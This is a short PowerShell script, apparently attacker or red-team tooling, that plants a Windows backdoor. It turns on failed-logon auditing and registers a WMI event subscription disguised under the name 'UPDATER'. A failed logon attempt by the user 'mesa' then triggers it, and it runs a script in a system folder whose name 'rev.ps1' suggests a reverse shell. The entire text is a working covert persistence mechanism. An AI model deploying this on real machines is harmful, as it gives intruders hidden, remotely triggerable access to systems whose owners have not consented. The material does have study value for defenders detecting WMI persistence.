#dump firewall rules backdoor
#try and login using the user 'mesa' (thru rdp, mount a share, etc.)
auditpol /set /subcategory:Logon /failure:Enable
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = 'UPDATER'; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%mesa%'"; QueryLanguage = 'WQL'}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = 'UPDATER'; CommandLineTemplate = 'powershell -c C:\Windows\apppatch\Custom\rev.ps1'}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments @{Filter = $filter; Consumer = $consumer}
